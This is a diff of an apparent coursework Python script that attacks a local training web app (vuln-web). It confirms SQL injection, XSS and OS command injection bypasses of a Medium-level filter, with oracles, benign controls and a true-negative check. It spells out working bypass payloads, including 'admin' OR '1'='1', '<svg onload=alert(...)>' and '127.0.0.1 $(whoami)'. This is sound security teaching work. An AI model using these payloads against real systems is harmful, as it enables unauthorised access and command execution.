@@ -1,163 +1,199 @@
-# Homework 2 — Web Attack & Defend — Part A (Attack) — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
-"""Part A — confirm THREE distinct vulnerability classes (SQLi, XSS, cmdi), each
-through a Medium-filter bypass, each confirmed by a SOUND ORACLE.
+# HW2 — Web Attack & Defend — Part A (Attack) — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
+"""Part A — confirm THREE vulnerability classes (SQLi, XSS, cmdi), each THROUGH a
+Medium-filter bypass, each confirmed by a SOUND ORACLE.
 
 Discipline (scorecard axis 3): a finding is NOT "the page looked different." It is
 "a sound oracle confirmed a security-relevant effect, reproducibly." So for each
 class we:
 
-  1. show the naive week-6 payload is BLOCKED by the Medium filter (medium.py),
-  2. find a one-line BYPASS (case / comment / alternate-metacharacter / tag) that
-     the Medium filter PASSES,
-  3. send the bypass to the REAL vuln-web sink and confirm the effect with an
-     oracle (canary leak / unescaped live markup / shell metachar reached cmd),
-  4. run a BENIGN control that the filter passes and the oracle must NOT confirm —
-     a false positive in our own tooling would poison every number downstream.
+  1. send a canonical BASELINE payload THROUGH the Medium filter (common/medium_filter)
+     and show the oracle does NOT confirm — proof the filter really neutralises the
+     obvious attack, so a bypass was necessary (not a strawman filter);
+  2. send >=3 BYPASSES (case / inline-comment / alternate-vector) through the SAME
+     filter and confirm each with the oracle on the real sink;
+  3. run a BENIGN control per class that the filter passes and the oracle must NOT
+     confirm — a false positive in our own tooling would poison every downstream number;
+  4. for XSS, also fire the bypass at the FIXED /safe endpoint as a TRUE NEGATIVE.
 
-Each payload is fired trials=3 times; a finding reports successes/trials so a
-flaky confirmation can't masquerade as a reliable exploit.
+Every payload is fired trials=3; a finding reports successes/trials so a flaky
+confirmation cannot masquerade as a reliable exploit.
 
-Run:  python attack/attack.py      (writes results/attack_findings.csv)
+Run:  python attack/attack.py      (writes results/attack_findings.csv + .json)
 """
 from __future__ import annotations
 
+import csv
 import json
 import sys
 from pathlib import Path
 
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+from common import app_harness as H          # noqa: E402
+from common import medium_filter as MF        # noqa: E402
+
+from seclab.attack import Payload, run_payloads  # noqa: E402
+
 HERE = Path(__file__).resolve().parent
-sys.path.insert(0, str(HERE.parent))   # homework/hw2/avalos (for _harness)
-sys.path.insert(0, str(HERE))          # for medium
-
-import _harness as H                   # noqa: E402  (puts course ROOT on sys.path)
-import medium                          # noqa: E402
-
-from seclab.attack import Payload, run_payloads, contains_oracle  # noqa: E402
-
 TRIALS = 3
 
+PLAN = {
+    "sqli": {
+        "owasp": "A03:2021 – Injection",
+        "sink": "POST /login (do_login) — string-formatted SQL",
+        "payloads": [
+            dict(text="admin' or '1'='1", role="baseline", note="",
+                 technique="canonical tautology (lowercase) — blocklisted by Medium"),
+            dict(text="admin' OR '1'='1", role="bypass", note="",
+                 technique="CASE: uppercase OR evades the case-sensitive blocklist"),
+            dict(text="admin'/**/Or/**/'1'='1", role="bypass", note="",
+                 technique="COMMENT+CASE: /**/ splits tokens, mixed-case Or"),
+            dict(text="admin'/**/-- -", role="bypass", note="",
+                 technique="COMMENT: inline comment terminates the pw check"),
+        ],
+    },
+    "xss": {
+        "owasp": "A03:2021 – Injection (Cross-Site Scripting)",
+        "sink": "GET /?name= (do_reflect) — unescaped into HTML",
+        "payloads": [
+            dict(text="<script>alert('XSS-7f3a')</script>", role="baseline",
+                 note="<script>", technique="canonical <script> (removed by str_replace)"),
+            dict(text="<ScRiPt>alert('XSS-7f3a')</ScRiPt>", role="bypass",
+                 note="<ScRiPt>", technique="CASE: mixed-case tag evades case-sensitive str_replace"),
+            dict(text="<scr<script>ipt>alert('XSS-7f3a')</script>", role="bypass",
+                 note="<script>", technique="NESTED: single-pass removal reconstitutes <script>"),
+            dict(text="<svg onload=alert('XSS-7f3a')>", role="bypass",
+                 note="<svg onload=", technique="ALT-VECTOR: event handler, no <script> token"),
+        ],
+    },
+    "cmdi": {
+        "owasp": "A03:2021 – Injection (OS Command Injection)",
+        "sink": "POST /ping (do_ping) — host concatenated into a command",
+        "payloads": [
+            dict(text="127.0.0.1; whoami", role="baseline", note="",
+                 technique="canonical ';' separator (stripped by Medium)"),
+            dict(text="127.0.0.1 | whoami", role="bypass", note="",
+                 technique="pipe '|' — not in the {; &&} strip set"),
+            dict(text="127.0.0.1 & whoami", role="bypass", note="",
+                 technique="single '&' — filter strips only '&&'"),
+            dict(text="127.0.0.1 $(whoami)", role="bypass", note="",
+                 technique="command substitution $( ) — survives entirely"),
+        ],
+    },
+}
 
-# --- sound oracles -----------------------------------------------------------
-def xss_oracle(payload: Payload, response: str):
-    """Sound necessary condition for reflected XSS: the injected markup survives
-    UNescaped (a live ``<...>`` element), not merely reflected as text. We tie it
-    to a per-payload marker so we confirm THIS injection, not any stray '<'."""
-    marker = payload.note                      # e.g. onerror=alert('XSS-7f3a')
-    live = (marker in response) and ("&lt;" not in response) and ("<" in response)
-    return live, (f"live unescaped markup carrying {marker!r}" if live else "")
-
-
-def cmdi_oracle(payload: Payload, response: str):
-    """Sound oracle for cmdi: the app reports a shell metacharacter reached the
-    command context (injection_detected), not that the host was echoed."""
-    try:
-        detected = json.loads(response).get("injection_detected") is True
-    except Exception:
-        detected = False
-    return detected, ("shell metacharacter reached command context" if detected else "")
-
-
-# --- the three classes -------------------------------------------------------
-def confirm_sqli():
-    naive = "admin' OR 1=1--"
-    bypass = "admin' OR 'a'='a'--"            # non-numeric tautology: evades OR d=d
-    benign = "alice"                          # a real username, wrong password
-    payloads = [
-        Payload(bypass, intent="auth-bypass + canary leak", family="sqli",
-                note="comment/logic bypass of OR d=d rule"),
-        Payload(benign, intent="benign control", family="benign"),
-    ]
-    findings = run_payloads(payloads, send=H.login_send,
-                            oracle=contains_oracle(H.canary()), trials=TRIALS)
-    return naive, bypass, findings
-
-
-def confirm_xss():
-    naive = "<script>alert('XSS-7f3a')</script>"
-    marker = "onerror=alert('XSS-7f3a')"
-    bypass = f"<img src=x {marker}>"          # no <script tag: evades the Medium rule
-    benign = "Keoma O'Brien"                  # a legit name with an apostrophe
-    payloads = [
-        Payload(bypass, intent="reflected XSS via event handler", family="xss",
-                note=marker),
-        Payload(benign, intent="benign control", family="benign",
-                note="no-such-marker"),
-    ]
-    vuln = run_payloads(payloads, send=H.reflect_send, oracle=xss_oracle, trials=TRIALS)
-    # True negative: same bypass at the FIXED /safe endpoint must NOT confirm.
-    safe = run_payloads([payloads[0]], send=H.reflect_safe_send,
-                        oracle=xss_oracle, trials=TRIALS)[0]
-    return naive, bypass, vuln, safe
+BENIGN = {
+    "sqli": dict(text="alice", note="", why="a real username, wrong password"),
+    "xss": dict(text="Keoma O'Brien", note="no-such-marker", why="legit name with an apostrophe"),
+    "cmdi": dict(text="api.internal.example", note="", why="a plain hostname, no metacharacters"),
+}
 
 
-def confirm_cmdi():
-    naive = "127.0.0.1; whoami"
-    bypass = "127.0.0.1 | whoami"             # pipe: evades ';' and '&&' rules
-    benign = "api.internal.example"           # a plain hostname, no metacharacters
-    payloads = [
-        Payload(bypass, intent="smuggle second command", family="cmdi",
-                note="alternate metacharacter '|'"),
-        Payload(benign, intent="benign control", family="benign"),
-    ]
-    findings = run_payloads(payloads, send=H.ping_send, oracle=cmdi_oracle, trials=TRIALS)
-    return naive, bypass, findings
-
-
-def main():
-    H.serve()
-    rows = []   # class, naive, naive_blocked_by, bypass, bypass_passes_medium, confirmed, successes/trials, owasp, evidence
-
-    # SQLi -------------------------------------------------------------------
-    naive, bypass, fs = confirm_sqli()
-    f = fs[0]
-    rows.append(["sqli", naive, medium.sqli_medium(naive), bypass,
-                 medium.sqli_medium(bypass) is None, f.confirmed,
-                 f"{f.successes}/{f.trials}", "A03:2021 Injection", f.evidence])
-    benign = fs[1]
-    rows.append(["sqli-benign-control", benign.payload.text, "-", "-", "-",
-                 benign.confirmed, f"{benign.successes}/{benign.trials}",
-                 "A03:2021 Injection", benign.evidence or "no canary (correct)"])
-
-    # XSS --------------------------------------------------------------------
-    naive, bypass, vuln, safe = confirm_xss()
-    fv = vuln[0]
-    rows.append(["xss", naive, medium.xss_medium(naive), bypass,
-                 medium.xss_medium(bypass) is None, fv.confirmed,
-                 f"{fv.successes}/{fv.trials}", "A03:2021 Injection", fv.evidence])
-    fb = vuln[1]
-    rows.append(["xss-benign-control", fb.payload.text, "-", "-", "-",
-                 fb.confirmed, f"{fb.successes}/{fb.trials}",
-                 "A03:2021 Injection", fb.evidence or "no live marker (correct)"])
-    rows.append(["xss-true-negative(/safe)", bypass, "-", bypass,
-                 medium.xss_medium(bypass) is None, safe.confirmed,
-                 f"{safe.successes}/{safe.trials}", "A03:2021 Injection",
-                 safe.evidence or "escaped by html.escape (correct)"])
-
-    # cmdi -------------------------------------------------------------------
-    naive, bypass, fs = confirm_cmdi()
-    f = fs[0]
-    rows.append(["cmdi", naive, medium.cmdi_medium(naive), bypass,
-                 medium.cmdi_medium(bypass) is None, f.confirmed,
-                 f"{f.successes}/{f.trials}", "A03:2021 Injection", f.evidence])
-    benign = fs[1]
-    rows.append(["cmdi-benign-control", benign.payload.text, "-", "-", "-",
-                 benign.confirmed, f"{benign.successes}/{benign.trials}",
-                 "A03:2021 Injection", benign.evidence or "no metachar (correct)"])
-
-    out = HERE / "results" / "attack_findings.csv"
-    H.write_csv(out, ["class", "naive_payload", "naive_blocked_by",
-                      "bypass_payload", "bypass_passes_medium", "oracle_confirmed",
-                      "successes/trials", "owasp_2021", "oracle_evidence"], rows)
-
-    # console summary
-    print("PART A — attack (each class confirmed through a Medium-filter bypass)\n")
-    for r in rows:
-        tag = "CONFIRMED" if r[5] is True else ("clean" if r[5] is False else r[5])
-        print(f"  {r[0]:<26} {tag:<10} {r[6]:<6} "
-              f"naive_blocked={r[2]!s:<40} bypass_passes={r[4]}")
-    print(f"\n  wrote {out.relative_to(H.ROOT)}")
+def run_class(kind: str, spec: dict) -> list[dict]:
+    send = H.make_send(kind, defense=MF)        # Medium filter IN FRONT of the sink
+    oracle = H.ORACLES[kind]()
+    payloads = [Payload(text=p["text"], family=kind, intent=p["role"], note=p["note"])
+                for p in spec["payloads"]]
+    findings = run_payloads(payloads, send=send, oracle=oracle, trials=TRIALS)
+    rows = []
+    for meta, f in zip(spec["payloads"], findings):
+        rows.append({
+            "class": kind, "owasp": spec["owasp"], "sink": spec["sink"],
+            "payload": meta["text"], "role": meta["role"], "technique": meta["technique"],
+            "confirmed": f.confirmed, "successes_trials": f"{f.successes}/{f.trials}",
+            "evidence": f.evidence or "(no effect — filter neutralised it)",
+        })
+    # benign control (passes the filter, oracle must stay silent)
+    b = BENIGN[kind]
+    bf = run_payloads([Payload(text=b["text"], family="benign", note=b["note"])],
+                      send=send, oracle=oracle, trials=TRIALS)[0]
+    rows.append({
+        "class": f"{kind}-benign-control", "owasp": spec["owasp"], "sink": spec["sink"],
+        "payload": b["text"], "role": "benign", "technique": b["why"],
+        "confirmed": bf.confirmed, "successes_trials": f"{bf.successes}/{bf.trials}",
+        "evidence": bf.evidence or "no effect (correct)",
+    })
     return rows
 
 
+def xss_true_negative() -> dict:
+    # Same alt-vector bypass at the FIXED /safe endpoint must NOT confirm.
+    send = H.make_send("xss", defense=MF, fixed=True)
+    p = Payload(text="<svg onload=alert('XSS-7f3a')>", family="xss", note="<svg onload=")
+    f = run_payloads([p], send=send, oracle=H.xss_oracle(), trials=TRIALS)[0]
+    return {
+        "class": "xss-true-negative(/safe)", "owasp": "A03:2021 – Injection",
+        "sink": "GET /safe (do_reflect_safe) — html.escape", "payload": p.text,
+        "role": "true-negative", "technique": "same bypass, fixed endpoint",
+        "confirmed": f.confirmed, "successes_trials": f"{f.successes}/{f.trials}",
+        "evidence": f.evidence or "escaped by html.escape (correct)",
+    }
+
+
+def broken_access_control_note() -> str:
+    return (
+        "A01:2021 Broken Access Control is NOT reachable in vuln-web: the app has no "
+        "sessions, roles, object ownership or authorization checks of any kind — there "
+        "is no access-control logic to break. The SQLi auth-bypass lets an attacker "
+        "read the admin row, but that is a confidentiality failure via Injection (A03), "
+        "not a broken access-control decision (A01): the authentication bypass is a "
+        "CONSEQUENCE of the injection, not evidence of a broken access-control layer. "
+        "Demonstrating a real A01 finding would need an endpoint that CHECKS a role or "
+        "owner and does it wrong; a single-file app with no such check cannot manufacture "
+        "one. This matches duel-2-web/ground_truth.json's explicit 'not_present: "
+        "broken-access-control' and the week-6 lesson that #1 needs app semantics, not "
+        "a payload — the exact point Part C makes the LLM fail on."
+    )
+
+
+def main() -> int:
+    all_rows, summary = [], {}
+    for kind, spec in PLAN.items():
+        rows = run_class(kind, spec)
+        all_rows.extend(rows)
+        confirmed_bypasses = [r for r in rows if r["role"] == "bypass" and r["confirmed"]]
+        baseline = next(r for r in rows if r["role"] == "baseline")
+        summary[kind] = {
+            "owasp": spec["owasp"], "sink": spec["sink"],
+            "baseline_neutralised_by_filter": not baseline["confirmed"],
+            "confirmed_bypasses": len(confirmed_bypasses),
+            "example_bypass": confirmed_bypasses[0]["payload"] if confirmed_bypasses else None,
+        }
+    tn = xss_true_negative()
+    all_rows.append(tn)
+
+    csv_path = HERE / "results" / "attack_findings.csv"
+    csv_path.parent.mkdir(parents=True, exist_ok=True)
+    with csv_path.open("w", newline="", encoding="utf-8") as fh:
+        w = csv.DictWriter(fh, fieldnames=list(all_rows[0].keys()))
+        w.writeheader()
+        w.writerows(all_rows)
+
+    out = {
+        "target": "vuln-web (labs/vuln-web/app/vulnweb_app.py), in-process on 127.0.0.1",
+        "filter_level": "Medium (DVWA-style built-in filter, common/medium_filter.py), "
+                        "fired IN FRONT of every sink so each bypass had to defeat it",
+        "oracle_trials_each": TRIALS,
+        "classes": summary,
+        "xss_true_negative_safe_confirmed": tn["confirmed"],
+        "broken_access_control": broken_access_control_note(),
+        "rows": all_rows,
+    }
+    (HERE / "results" / "attack_findings.json").write_text(json.dumps(out, indent=2),
+                                                           encoding="utf-8")
+
+    print(f"PART A — attack at Medium ({TRIALS} trials/payload, oracle-confirmed)\n")
+    for kind, s in summary.items():
+        print(f"  {kind.upper():5} {s['owasp']}")
+        print(f"        baseline neutralised by filter : {s['baseline_neutralised_by_filter']}")
+        print(f"        confirmed bypasses             : {s['confirmed_bypasses']}  "
+              f"e.g. {s['example_bypass']!r}")
+    print(f"  XSS   /safe true-negative confirmed? {tn['confirmed']}  (must be False)")
+    confirmed_classes = sum(1 for s in summary.values() if s["confirmed_bypasses"] >= 3)
+    print(f"\n  wrote results/attack_findings.csv + .json")
+    print(f"  {confirmed_classes}/3 classes with >=3 oracle-confirmed bypasses at Medium.")
+    ok = confirmed_classes == 3 and not tn["confirmed"]
+    return 0 if ok else 1
+
+
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
